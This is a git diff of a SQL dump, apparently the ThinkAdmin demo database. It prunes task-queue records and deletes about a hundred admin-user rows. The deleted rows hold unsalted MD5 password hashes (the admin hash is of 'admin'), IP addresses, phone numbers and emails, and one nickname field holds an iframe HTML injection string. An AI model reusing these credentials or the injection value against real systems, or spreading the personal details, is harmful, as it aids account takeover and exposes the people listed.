   INDEX `idx_system_queue_exec_time`(`exec_time`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 203 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-任务' ROW_FORMAT = Compact;
+) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-任务' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of system_queue
 -- ----------------------------
-INSERT INTO `system_queue` VALUES (166, 'Q202102056625581', '定时清理无效订单数据', 'xdata:OrderClear', 0, '[]', 1614161167, '', 1614161107.0496, 1614161107.0573, 60, 23907, 0, 1, '2021-02-05 17:49:25');
-INSERT INTO `system_queue` VALUES (167, 'Q202102055635113', '提现到余额定时处理', 'xdata:UserTransfer', 0, '[]', 1614161148, '', 1614161098.0124, 1614161098.0168, 50, 29620, 0, 1, '2021-02-05 19:37:35');
-INSERT INTO `system_queue` VALUES (178, 'Q202102186620773', '优化数据库所有数据表', 'xadmin:database optimize', 2876761, '[]', 1613616980, '已完成对 42 张数据表优化操作', 1613616981.5605, 1613616995.7170, 0, 1, 0, 3, '2021-02-18 10:56:20');
-INSERT INTO `system_queue` VALUES (180, 'Q202102183103967', '优化数据库所有数据表', 'xadmin:database optimize', 2889083, '[]', 1613625483, '已完成对 42 张数据表优化操作', 1613625486.3066, 1613625505.7333, 0, 1, 0, 3, '2021-02-18 13:18:03');
-INSERT INTO `system_queue` VALUES (181, 'Q202102184653940', '优化数据库所有数据表', 'xadmin:database optimize', 2905881, '[]', 1613637053, '已完成对 42 张数据表优化操作', 1613637054.4855, 1613637070.6967, 0, 1, 0, 3, '2021-02-18 16:30:53');
-INSERT INTO `system_queue` VALUES (182, 'Q202102185556125', '优化数据库所有数据表', 'xadmin:database optimize', 2911789, '[]', 1613641136, '已完成对 42 张数据表优化操作', 1613641137.5589, 1613641157.9383, 0, 1, 0, 3, '2021-02-18 17:38:56');
-INSERT INTO `system_queue` VALUES (183, 'Q202102197350266', '优化数据库所有数据表', 'xadmin:database optimize', 3022998, '[]', 1613717990, '已完成对 42 张数据表优化操作', 1613717990.7227, 1613718032.3627, 0, 1, 0, 3, '2021-02-19 14:59:50');
-INSERT INTO `system_queue` VALUES (184, 'Q202102202753397', '优化数据库所有数据表', 'xadmin:database optimize', 3122975, '[]', 1613787473, '已完成对 42 张数据表优化操作', 1613787474.7334, 1613787512.3491, 0, 1, 0, 3, '2021-02-20 10:17:53');
-INSERT INTO `system_queue` VALUES (185, 'Q202102207217335', '同步微信用户数据', 'xadmin:fansall', 3147091, '[]', 1613804297, '共获取 202 个用户数据, 其中黑名单 24 人, 获取到 5 个标签', 1613804299.0656, 1613804310.0912, 0, 1, 0, 3, '2021-02-20 14:58:17');
-INSERT INTO `system_queue` VALUES (186, 'Q202102204036691', '优化数据库所有数据表', 'xadmin:database optimize', 3174894, '[]', 1613823636, '已完成对 42 张数据表优化操作', 1613823638.8478, 1613823694.1514, 0, 1, 0, 3, '2021-02-20 20:20:36');
-INSERT INTO `system_queue` VALUES (187, 'Q202102227140548', '优化数据库所有数据表', 'xadmin:database optimize', 229545, '[]', 1613969980, '已完成对 42 张数据表优化操作', 1613969980.9304, 1613969983.1065, 0, 1, 0, 3, '2021-02-22 12:59:40');
-INSERT INTO `system_queue` VALUES (188, 'Q202102225159464', '优化数据库所有数据表', 'xadmin:database optimize', 233019, '[]', 1613972339, '已完成对 42 张数据表优化操作', 1613972339.6364, 1613972340.5264, 0, 1, 0, 3, '2021-02-22 13:38:59');
-INSERT INTO `system_queue` VALUES (189, 'Q202102223141534', '优化数据库所有数据表', 'xadmin:database optimize', 246778, '[]', 1613981741, '已完成对 42 张数据表优化操作', 1613981742.3436, 1613981743.7411, 0, 1, 0, 3, '2021-02-22 16:15:41');
-INSERT INTO `system_queue` VALUES (190, 'Q202102224046548', '优化数据库所有数据表', 'xadmin:database optimize', 253314, '[]', 1613985826, '已完成对 42 张数据表优化操作', 1613985826.9523, 1613985830.0821, 0, 1, 0, 3, '2021-02-22 17:23:46');
-INSERT INTO `system_queue` VALUES (191, 'Q202102223443754', '优化数据库所有数据表', 'xadmin:database optimize', 263210, '[]', 1613992543, '已完成对 42 张数据表优化操作', 1613992544.0066, 1613992546.1450, 0, 1, 0, 3, '2021-02-22 19:15:43');
-INSERT INTO `system_queue` VALUES (192, 'Q202102239452504', '优化数据库所有数据表', 'xadmin:database optimize', 294133, '[]', 1614013725, '已完成对 42 张数据表优化操作', 1614013725.8801, 1614013727.0993, 0, 1, 0, 3, '2021-02-23 01:08:45');
-INSERT INTO `system_queue` VALUES (193, 'Q202102236516794', '优化数据库所有数据表', 'xadmin:database optimize', 361336, '[]', 1614059536, '已完成对 42 张数据表优化操作', 1614059537.3246, 1614059539.9816, 0, 1, 0, 3, '2021-02-23 13:52:16');
-INSERT INTO `system_queue` VALUES (194, 'Q202102231712837', '优化数据库所有数据表', 'xadmin:database optimize', 367549, '[]', 1614063732, '已完成对 41 张数据表优化操作', 1614063732.2903, 1614063734.4360, 0, 1, 0, 3, '2021-02-23 15:02:12');
-INSERT INTO `system_queue` VALUES (195, 'Q202102235914741', '定时清理系统运行数据', 'xadmin:queue clean', 0, '[]', 1614163457, '清理 0 条历史任务，关闭 0 条超时任务，重置 0 条循环任务', 1614159857.6077, 1614159857.6168, 3600, 27, 0, 1, '2021-02-23 15:44:14');
-INSERT INTO `system_queue` VALUES (196, 'Q202102235919958', '优化数据库所有数据表', 'xadmin:database optimize', 371296, '[]', 1614066259, '已完成对 41 张数据表优化操作', 1614066260.0016, 1614066261.2176, 0, 1, 0, 3, '2021-02-23 15:44:19');
-INSERT INTO `system_queue` VALUES (197, 'Q202102245401900', '优化数据库所有数据表', 'xadmin:database optimize', 454730, '[]', 1614138181, '已完成对 41 张数据表优化操作', 1614138182.7464, 1614138185.6740, 0, 1, 0, 3, '2021-02-24 11:43:01');
-INSERT INTO `system_queue` VALUES (198, 'Q202102246046666', '优化数据库所有数据表', 'xadmin:database optimize', 465246, '[]', 1614145666, '已完成对 41 张数据表优化操作', 1614145667.8725, 1614145669.0427, 0, 1, 0, 3, '2021-02-24 13:47:46');
-INSERT INTO `system_queue` VALUES (199, 'Q202102243147379', '同步微信用户数据', 'xadmin:fansall', 472763, '[]', 1614151007, '共获取 202 个用户数据, 其中黑名单 18 人, 获取到 5 个标签', 1614151008.3728, 1614151014.8686, 0, 1, 0, 3, '2021-02-24 15:16:47');
-INSERT INTO `system_queue` VALUES (200, 'Q202102246855417', '优化数据库所有数据表', 'xadmin:database optimize', 486167, '[]', 1614160315, '已完成对 41 张数据表优化操作', 1614160315.9135, 1614160317.8978, 0, 1, 0, 3, '2021-02-24 17:51:55');
-INSERT INTO `system_queue` VALUES (201, 'Q202102247051001', '优化数据库所有数据表', 'xadmin:database optimize', 486342, '[]', 1614160431, '已完成对 41 张数据表优化操作', 1614160432.3618, 1614160433.3353, 0, 1, 0, 3, '2021-02-24 17:53:51');
-INSERT INTO `system_queue` VALUES (202, 'Q202102247154182', '优化数据库所有数据表', 'xadmin:database optimize', 486450, '[]', 1614160494, '已完成对 41 张数据表优化操作', 1614160495.5312, 1614160496.5494, 0, 1, 0, 3, '2021-02-24 17:54:54');
+INSERT INTO `system_queue` VALUES (1, 'Q202102235804511', '优化数据库所有数据表', 'xadmin:database optimize', 13040, '[]', 1614073264, '已完成对 41 张数据表优化操作', 1614073265.3524, 1614073270.0566, 0, 1, 0, 3, '2021-02-23 09:21:43');
 
 -- ----------------------------
 -- Table structure for system_user
@@ -5832,134 +4823,12 @@ CREATE TABLE `system_user`  (
   INDEX `idx_system_user_status`(`status`) USING BTREE,
   INDEX `idx_system_user_username`(`username`) USING BTREE,
   INDEX `idx_system_user_deleted`(`is_deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 10124 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-用户' ROW_FORMAT = Compact;
+) ENGINE = InnoDB AUTO_INCREMENT = 10001 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-用户' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of system_user
 -- ----------------------------
-INSERT INTO `system_user` VALUES (10000, 'admin', '21232f297a57a5a743894a0e4a801fc3', '超级管理员', 'https://v6.thinkadmin.top/upload/a3/4c06ca523a7fd15b4e3182174ab7df.jpg', ',,', '', 'dd@qq.ocm333333', '15424561245', '58.35.215.135', '2021-02-24 17:56:59', 45228, '', 1, 0, 0, '2015-11-13 15:14:22');
-INSERT INTO `system_user` VALUES (10001, 'test', '', '<iframe src=\"https://www.baidu.com\" frameborder=\"0', 'https://v6.thinkadmin.top/upload/c8/53c0a526503dd8399048c95e6f0f69.jpg', '8,7', '22223333', 'test@test.com', '13345678901', '', '', 0, '', 0, 0, 1, '2020-01-09 11:21:02');
-INSERT INTO `system_user` VALUES (10002, 'test2', '', 'test2', '', '6,4', '', '82367498@aq.con', '', '', '', 0, '', 1, 0, 1, '2020-01-12 13:52:16');
-INSERT INTO `system_user` VALUES (10003, 'wwww', '', 'wwww', '', '6', '', '', '', '', '', 0, '', 0, 0, 1, '2020-01-14 03:28:36');
-INSERT INTO `system_user` VALUES (10004, 'test3', '', 'test3', '', '6,4', '', 'test@1.23com', '13111111111', '', '', 0, '', 1, 0, 1, '2020-01-21 04:13:31');
-INSERT INTO `system_user` VALUES (10005, 'sunyousong', '', 'sunyousong', 'https://v6.thinkadmin.top/upload/05/9ccacb977cf7c1a1fd3d91d13075cf.gif', '9', '657359940', 'sun@163.com', '13916788159', '', '', 0, '132', 1, 0, 1, '2020-02-05 21:35:28');
-INSERT INTO `system_user` VALUES (10006, 'qqqqq', '537a69ddd07a24edda50d8c505ff403e', 'qqqqq', 'https://v6.thinkadmin.top/upload/f7/12154898167b4d8cd19d8ce921c743.jpg', '19,16,10', '', '', '', '223.11.190.91', '2020-03-03 23:42:02', 1, '', 0, 1, 1, '2020-02-06 23:08:08');
-INSERT INTO `system_user` VALUES (10007, 'test001', '', 'test001', '', '11,10,9', '', '', '', '', '', 0, '', 0, 0, 1, '2020-02-07 16:09:53');
-INSERT INTO `system_user` VALUES (10008, 'test', '', 'test', '', '10', '', '', '', '', '', 0, '', 0, 0, 1, '2020-02-26 14:32:44');
-INSERT INTO `system_user` VALUES (10009, 'kkk123', '', 'kkk', 'https://v6.thinkadmin.top/upload/55/0f986c5f7ba815e53919b3ea3c15b9.jpg', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-02-28 15:22:33');
-INSERT INTO `system_user` VALUES (10010, 'thinkadmin', '', 'thinkadmin', 'https://v6.thinkadmin.top/upload/77/8ec690ff1c434d35efb2df9907b544.png', '10', '', '', '', '', '', 0, '密码thinkadmin', 0, 0, 1, '2020-02-29 23:10:23');
-INSERT INTO `system_user` VALUES (10011, 'test1', 'e542fb4a80e40dd29450168c4f730955', 'test1', 'https://v6.thinkadmin.top/upload/5a/44c7ba5bbe4ec867233d67e4806848.jpg', '19,16,10', '', 'sdsads@qq.com', '', '116.114.97.70', '2020-03-04 09:34:55', 1, '', 0, 0, 1, '2020-03-04 09:33:56');
-INSERT INTO `system_user` VALUES (10012, 'test2', '', 'test2', '', '16,14,13,12,10', '', '', '', '', '', 0, 'aadad', 0, 0, 1, '2020-03-12 17:23:12');
-INSERT INTO `system_user` VALUES (10013, 'test3', '', 'test3', '', '18', '', '', '', '', '', 0, '', 0, 0, 1, '2020-03-15 00:39:16');
-INSERT INTO `system_user` VALUES (10014, 'test4', '', 'test4', '', '16,10', '', '', '', '', '', 0, '', 0, 0, 1, '2020-03-15 00:45:14');
-INSERT INTO `system_user` VALUES (10015, 'cs123', '', 'cs123', 'https://v6.thinkadmin.top/upload/89/cb242b0bd46fcecf073d45afa8032d.jpg', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-03-18 14:20:53');
-INSERT INTO `system_user` VALUES (10016, 'admin123', '', 'admin', '', '20,19,16,10', '', '', '', '', '', 0, '123', 0, 0, 1, '2020-03-19 17:23:24');
-INSERT INTO `system_user` VALUES (10017, 'test123', '', 'test', '', '19,16', '', '', '', '', '', 0, '', 0, 0, 1, '2020-03-20 19:36:37');
-INSERT INTO `system_user` VALUES (10018, 'admin1', '', 'admin1', '', '', '', '', '', '', '', 0, 'sdfsdf', 0, 0, 1, '2020-03-26 09:50:44');
-INSERT INTO `system_user` VALUES (10019, 'test', '', 'test', '', '', '', '', '', '', '', 0, 'sdfasdf', 0, 11, 1, '2020-03-27 02:47:23');
-INSERT INTO `system_user` VALUES (10020, 'test001', '', 'test001', '', '', '', '', '', '', '', 0, '', 0, 1, 1, '2020-03-30 08:46:58');
-INSERT INTO `system_user` VALUES (10021, 'auser', '', 'auser', 'https://v6.thinkadmin.top/upload/74/9dabd6ddccaec1403b62e43d8dd132.png', '21', '1054687454', '102@qq.com', '18555555555', '', '', 0, '', 0, 45, 1, '2020-04-02 08:36:05');
-INSERT INTO `system_user` VALUES (10022, '14545', '', '4846546', '', '21', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-09 15:51:24');
-INSERT INTO `system_user` VALUES (10023, 'kevin', '', 'kevin', '', '21', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-15 14:22:12');
-INSERT INTO `system_user` VALUES (10024, 'test1', '', 'test1', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-15 17:20:31');
-INSERT INTO `system_user` VALUES (10025, 'test2', '', 'test2', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-15 17:21:10');
-INSERT INTO `system_user` VALUES (10026, 'test3', '', 'test3', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-15 17:21:20');
-INSERT INTO `system_user` VALUES (10027, 'test4', '', 'test4', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-15 17:21:48');
-INSERT INTO `system_user` VALUES (10028, 'test5', '', 'test5', 'https://v6.thinkadmin.top/upload/93/29f419c9e249777a5089bdef8ce04f.png', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-15 17:22:01');
-INSERT INTO `system_user` VALUES (10029, 'test6', '', 'test6', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-15 17:22:08');
-INSERT INTO `system_user` VALUES (10030, 'test', '', 'test', '', '33', '', '', '', '', '', 0, 'test', 0, 0, 1, '2020-04-16 17:36:59');
-INSERT INTO `system_user` VALUES (10031, 'qwe123', '', 'qwe123', '', '34', '', 'qwe@qq.com', '', '', '', 0, 'qwe123', 0, 0, 1, '2020-04-20 16:47:02');
-INSERT INTO `system_user` VALUES (10032, 'xiao', '', 'xiao', '', '36', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-21 11:19:44');
-INSERT INTO `system_user` VALUES (10033, 'xiaomi', '', 'xiaomi', 'https://v6.thinkadmin.top/upload/b3/cb5df0742abe264b76c04b6f71df0d.png', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-22 10:53:11');
-INSERT INTO `system_user` VALUES (10034, '1264570303', '', '王大锤', '', '40', '1264570303', '1264570303@qq.com', '13098783763', '', '', 0, '这是一个用户', 0, 0, 1, '2020-04-23 14:52:37');
-INSERT INTO `system_user` VALUES (10035, '123123', '', '123123', '', '42', '123123', '123123@qq.com', '15312312312', '', '', 0, '', 0, 0, 1, '2020-04-24 11:40:28');
-INSERT INTO `system_user` VALUES (10036, 'adasd', '', 'dasdd', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-26 11:21:01');
-INSERT INTO `system_user` VALUES (10037, 'gfdgfdgdfg', '', 'dfsd', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-29 10:07:36');
-INSERT INTO `system_user` VALUES (10038, 'test', '', 'test', '', '45', '', '', '', '', '', 0, '', 0, 0, 1, '2020-04-29 15:53:59');
-INSERT INTO `system_user` VALUES (10039, 'admin12', '', 'tt', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-05-06 11:38:34');
-INSERT INTO `system_user` VALUES (10040, 'admin111', '', 'adm', '', '55', '', '', '', '', '', 0, '', 0, 0, 1, '2020-05-07 21:22:48');
-INSERT INTO `system_user` VALUES (10041, 'admin123', '', 'admin123', 'https://v6.thinkadmin.top/upload/cf/2e05df5a3da9895e9bf6580fc6d3fa.png', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-05-08 16:01:49');
-INSERT INTO `system_user` VALUES (10042, '121212', '', '12121212', 'https://v6.thinkadmin.top/upload/6e/955e1df710567464d6a5cfa857218b.png', '58,57,56', '', '', '', '', '', 0, '', 0, 4, 1, '2020-05-08 16:29:33');
-INSERT INTO `system_user` VALUES (10043, '123123123', '', '123', '', '', '1231232122', '123@123.com', '13312312312', '', '', 0, '123', 0, 0, 1, '2020-05-09 12:53:26');
-INSERT INTO `system_user` VALUES (10044, 'llx123', '', 'ddd', 'https://v6.thinkadmin.top/upload/71/72b290b4fd94b17e735383bda36ca5.png', '45', '', '', '', '', '', 0, '', 0, 0, 1, '2020-05-12 14:05:36');
-INSERT INTO `system_user` VALUES (10045, '32540572', '', '爸爸', 'https://v6.thinkadmin.top/upload/6a/d0c0ed8b2a96aeef1fbe6d46917893.png', '52,51,50,49,48', '', '', '', '', '', 0, '爸爸', 0, 0, 1, '2020-05-21 12:47:36');
-INSERT INTO `system_user` VALUES (10046, 'test1212', '', 'test1212', '', '51,49', '', '', '', '', '', 0, '', 0, 0, 1, '2020-05-21 16:45:33');
-INSERT INTO `system_user` VALUES (10047, '123456', '', '阿萨德', '', '56', '', '', '', '', '', 0, '', 0, 3, 1, '2020-05-22 14:57:04');
-INSERT INTO `system_user` VALUES (10048, 'akun', '3d342d6e0c524dd57f1728a053eedff3', '123', 'https://v6.thinkadmin.top/upload/5b/fdfb8827f1f1c07dcd52ceb69ce3d4.png', '58', '1231231', '123@qq.com', '13593593333', '', '', 0, '', 0, 0, 1, '2020-05-31 11:35:47');
-INSERT INTO `system_user` VALUES (10049, 'test', '098f6bcd4621d373cade4e832627b4f6', 'test', 'https://v6.thinkadmin.top/upload/cd/a7d49dcb1742218d36b6cba1d2eff8.jpg', '59', '', '', '', '', '', 0, '', 0, 0, 1, '2020-06-03 16:53:59');
-INSERT INTO `system_user` VALUES (10050, '微信管理员', '2009c1e98567009f4cd6384814ce1640', '微信管理员', 'https://v6.thinkadmin.top/upload/79/c4cdae8ed06cc230f64d5a23e86a69.png', '', '', '', '', '117.179.212.148', '2020-06-07 18:57:45', 5, '', 0, 0, 1, '2020-06-04 08:46:01');
-INSERT INTO `system_user` VALUES (10051, 'ttest', 'e88a254ce4248cca0a7a84eb59727474', 'ttest', 'https://v6.thinkadmin.top/upload/a6/411e96553d0e4193945b874f09b185.png', '65,64,62', '', '', '', '112.193.1.197', '2020-06-10 18:04:18', 1, 'ttest', 0, 0, 1, '2020-06-10 18:03:47');
-INSERT INTO `system_user` VALUES (10053, 'username', '14c4b06b824ec593239362517f538b29', 'username', '', '76,75,73', '', '', '', '111.201.49.161', '2020-06-21 16:05:05', 3, '', 0, 0, 1, '2020-06-17 16:20:44');
-INSERT INTO `system_user` VALUES (10054, 'guest', '084e0343a0486ff05530df6c705c8bb4', 'guest', '', '79', '', '', '', '116.22.199.154', '2020-07-05 20:53:03', 5, '', 0, 1, 1, '2020-06-19 15:28:59');
-INSERT INTO `system_user` VALUES (10055, '123123', '4297f44b13955235245b2497399d7a93', '123123123', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-06-28 10:33:49');
-INSERT INTO `system_user` VALUES (10056, '14765556', '89c425d5fc6148dc2819814f6e129d28', '5555', '', '79', '', '', '', '', '', 0, '', 0, 0, 1, '2020-07-04 13:56:18');
-INSERT INTO `system_user` VALUES (10057, 'tttttt', 'bcc720f2981d1a68dbd66ffd67560c37', 'tttttt', '', '79,78', '', '', '', '120.36.26.212', '2020-07-12 16:06:34', 1, '', 0, 0, 1, '2020-07-12 16:06:09');
-INSERT INTO `system_user` VALUES (10058, 'maotou', 'b3b7547cc6f699738f50b98f23396559', 'maotou', '', '82', '', '', '', '110.53.253.184', '2020-07-13 16:48:48', 1, '', 0, 0, 1, '2020-07-13 16:47:59');
-INSERT INTO `system_user` VALUES (10059, '1323', '4671aeaf49c792689533b00664a5c3ef', '23', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-07-14 11:23:14');
-INSERT INTO `system_user` VALUES (10060, 'ceshi555', '40972b440021aa06aed5492b1418ab52', 'ceshi555', '', '95', '', '', '', '139.227.102.235', '2020-08-10 09:10:43', 4, '', 0, 0, 1, '2020-07-16 09:56:11');
-INSERT INTO `system_user` VALUES (10061, 'aaa234', '766348707da0572eb3828c053b1b0dad', 'qq', '', '87', '', '', '', '', '', 0, '', 0, 0, 1, '2020-07-16 20:35:57');
-INSERT INTO `system_user` VALUES (10062, 'aaaaa', '594f803b380a41396ed63dca39503542', 'aaaaa', '', '90', '', '', '', '', '', 0, '', 0, 0, 1, '2020-07-23 20:09:53');
-INSERT INTO `system_user` VALUES (10063, 'test', '098f6bcd4621d373cade4e832627b4f6', '121212', '', '84', '', '', '', '', '', 0, '', 0, 0, 1, '2020-07-30 11:00:46');
-INSERT INTO `system_user` VALUES (10064, '活动编辑', 'bf9e408b99adcce59775e836985c893a', '活动编辑', 'https://v6.thinkadmin.top/upload/2a/fd9ab9d4695d18424145d11fe23c05.jpg', '84', '', '', '', '113.109.109.17', '2020-07-31 18:29:37', 1, '', 0, 0, 1, '2020-07-30 13:09:01');
-INSERT INTO `system_user` VALUES (10065, '新闻编辑', 'd0142fa8971b9ada38e899d2c92c5db7', '新闻编辑', 'https://v6.thinkadmin.top/upload/12/8cc69e97e5bf5193f7d16e665ff475.jpg', '94,93,92,91,84', '', '', '', '', '', 0, '', 0, 0, 1, '2020-07-30 13:09:12');
-INSERT INTO `system_user` VALUES (10066, 'user', 'ee11cbb19052e40b07aac0ca060c23ee', 'user', '', '94', '', '', '', '101.24.176.56', '2020-08-03 16:47:09', 7, '', 0, 0, 1, '2020-08-03 14:10:21');
-INSERT INTO `system_user` VALUES (10067, 'test2', 'ad0234829205b9033196ba818f7a872b', 'test2', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-08-04 14:17:21');
-INSERT INTO `system_user` VALUES (10068, 'ceshi666', '690766b06cb43955b9c59f0efd75af89', 'ceshi666', 'https://v6.thinkadmin.top/upload/6a/d5e6eae6def9f28c5b4ef8e8e2df18.jpg', '96,95,93,92,91,84', '', '', '', '', '', 0, '', 0, 0, 1, '2020-08-10 09:09:39');
-INSERT INTO `system_user` VALUES (10069, 'aaaa111', '47f6dbe1bfa04db0dbb19e34f659f83f', '1122', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-08-12 14:02:42');
-INSERT INTO `system_user` VALUES (10070, '1232131321', 'd23a2c43854885df84a5b9dc46273a7d', '123213123', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-08-12 14:02:55');
-INSERT INTO `system_user` VALUES (10071, 'adadd', '94fe5395984666699f3d70f30d595524', 'adddad', '', '96,95,93,92,84', '1111111112', '1111123@qq.com', '18087879888', '', '', 0, '', 0, 0, 1, '2020-08-13 09:42:20');
-INSERT INTO `system_user` VALUES (10072, 'test', '098f6bcd4621d373cade4e832627b4f6', 'test', '', '98', '', '', '', '', '', 0, '', 0, 0, 1, '2020-08-14 17:31:56');
-INSERT INTO `system_user` VALUES (10073, 'ziker', '9f504408cebd6f8eba931c669f7f8550', 'ziker', '', '102', '', '', '', '120.230.89.61', '2020-08-21 18:57:26', 2, '', 0, 0, 1, '2020-08-21 18:54:56');
-INSERT INTO `system_user` VALUES (10074, '1001', 'b8c37e33defde51cf91e1e03e51657da', '1233', '', '98,97', '', '', '', '', '', 0, '', 0, 0, 1, '2020-08-21 23:15:49');
-INSERT INTO `system_user` VALUES (10075, '1111', 'b59c67bf196a4758191e42f76670ceba', '1111', '', '101,100,99,98', '', '', '', '223.71.139.24', '2020-08-26 17:13:51', 2, '', 0, 0, 1, '2020-08-26 17:06:25');
-INSERT INTO `system_user` VALUES (10076, 'ceshi', 'cc17c30cd111c7215fc8f51f8790e0e1', 'ceshi', '', '99,98', '', '', '', '122.238.145.227', '2020-08-31 14:31:39', 2, '', 0, 0, 1, '2020-08-26 17:06:53');
-INSERT INTO `system_user` VALUES (10077, 'eeeee', '86871b9b1ab33b0834d455c540d82e89', 'eeeee', '', '', '', '', '', '', '', 0, '', 0, 55, 1, '2020-09-05 10:08:35');
-INSERT INTO `system_user` VALUES (10078, 'admin123', '0192023a7bbd73250516f069df18b500', 'admin123', '', '98', '', '', '', '', '', 0, '', 0, 77, 1, '2020-09-08 13:48:47');
-INSERT INTO `system_user` VALUES (10079, 'abcd', 'e2fc714c4727ee9395f324cd2e7f331f', '123', 'https://v6.thinkadmin.top/upload/53/e9274a73762a9bc72498799de59751.png', '107', '', '', '', '', '', 0, '', 0, 0, 1, '2020-09-09 12:28:16');
-INSERT INTO `system_user` VALUES (10080, 'ceshi', 'cc17c30cd111c7215fc8f51f8790e0e1', 'cehis', '', '107,106', '', '', '', '', '', 0, '', 0, 0, 1, '2020-09-20 10:24:59');
-INSERT INTO `system_user` VALUES (10081, 'lisi', 'dc3a8f1670d65bea69b7b65048a0ac40', '李四', '', '107', '', '', '13833332222', '', '', 0, '', 0, 0, 1, '2020-09-25 11:02:21');
-INSERT INTO `system_user` VALUES (10082, '啊啊啊啊333', '23c8b962b05c9d20e9496815039c4760', '啊啊啊啊', '', '106', '', '', '', '', '', 0, '', 0, 0, 1, '2020-09-25 14:20:08');
-INSERT INTO `system_user` VALUES (10083, 'aaaaaa', '0b4e7a0e5fe84ad35fb5f95b9ceeac79', 'aaaa', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-10-05 22:33:40');
-INSERT INTO `system_user` VALUES (10084, 'test1', '5a105e8b9d40e1329780d62ea2265d8a', 'test1', '', '106,104', '', 'test1@qq.com', '15010103815', '', '', 0, '', 0, 0, 1, '2020-10-05 22:34:57');
-INSERT INTO `system_user` VALUES (10085, 'youyou', 'e75e2228a8036523189f451fcf2ae383', 'youyou', 'https://v6.thinkadmin.top/upload/d3/863873b498c94c0b4d1cfdcb152a6f.png', '110', '', '', '', '119.162.157.121', '2020-10-10 10:02:52', 1, '', 0, 3, 1, '2020-10-09 10:50:27');
-INSERT INTO `system_user` VALUES (10086, '测试用户', '34d3b909b53dd70975f38d0d49a74ca6', '测试', 'https://v6.thinkadmin.top/upload/b4/e34bf60203f28f15a63b2af1c32dcb.jpg', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-10-09 21:16:56');
-INSERT INTO `system_user` VALUES (10087, 'test', '098f6bcd4621d373cade4e832627b4f6', '每一个季节', 'https://v6.thinkadmin.top/upload/1f/a5bd4ca396c9875f7ed695981396ca.png', '113', '', '', '', '120.28.24.102', '2020-11-01 20:03:11', 4, '', 0, 2, 1, '2020-10-15 20:36:06');
-INSERT INTO `system_user` VALUES (10088, '222222', 'e3ceb5881a0a1fdaad01296d7554868d', '22222', 'https://v6.thinkadmin.top/upload/c6/188fdfde9a1dbd657262c80341bac3.png', '110', '', '', '', '', '', 0, '', 0, 0, 1, '2020-10-20 14:27:36');
-INSERT INTO `system_user` VALUES (10089, 'aaaaaa', '0b4e7a0e5fe84ad35fb5f95b9ceeac79', 'aaaaaa', '', '111', '', '', '', '', '', 0, '', 0, 0, 1, '2020-10-21 16:22:34');
-INSERT INTO `system_user` VALUES (10090, 'a123', '80c9ef0fb86369cd25f90af27ef53a9e', 'a123', '', '110', '', '123@qq.com', '', '119.92.8.241', '2020-10-24 14:44:07', 2, '', 0, 0, 1, '2020-10-21 20:51:57');
-INSERT INTO `system_user` VALUES (10091, 'fdffd', '2d17801580737ec705ebcfe193ae795d', 'dffddff', '', '111,110', '', '', '', '', '', 0, '', 0, 0, 1, '2020-10-22 10:31:13');
-INSERT INTO `system_user` VALUES (10092, 'xccc', '5008e9a6ea2ab282a9d646befa70d53a', 'xccxcxxc', '', '111,110', '', '', '', '', '', 0, '', 0, 0, 1, '2020-10-22 10:31:46');
-INSERT INTO `system_user` VALUES (10093, 'aaaa', '74b87337454200d4d33f80c4663dc5e5', 'aaaa', '', '111', '', '', '', '111.49.72.1', '2020-10-24 22:39:52', 2, '', 0, 0, 1, '2020-10-24 22:25:28');
-INSERT INTO `system_user` VALUES (10094, 'test2', 'ad0234829205b9033196ba818f7a872b', 'test2', '', '110', '', '', '', '', '', 0, '', 0, 0, 1, '2020-10-28 11:15:20');
-INSERT INTO `system_user` VALUES (10095, 'aaaa1', '51b568ea7c7969a881ebf3a6478f8486', 'aaaa', '', '112', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-01 11:32:10');
-INSERT INTO `system_user` VALUES (10096, 'admin1', 'e00cf25ad42683b3df678c61f42c6bda', 'admin2', '', '', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-04 17:44:57');
-INSERT INTO `system_user` VALUES (10097, 'user', 'ee11cbb19052e40b07aac0ca060c23ee', '普通管理员', '', '117', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-09 17:17:00');
-INSERT INTO `system_user` VALUES (10098, 'user', 'ee11cbb19052e40b07aac0ca060c23ee', 'user', 'https://v6.thinkadmin.top/upload/25/e9c92266d3b7ab86d3221b0c9305fe.jpg', ',,', '', '', '', '', '', 0, '123', 0, 0, 1, '2020-11-17 14:29:21');
-INSERT INTO `system_user` VALUES (10099, 'test1', '5a105e8b9d40e1329780d62ea2265d8a', 'test1', '', ',,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-18 17:25:29');
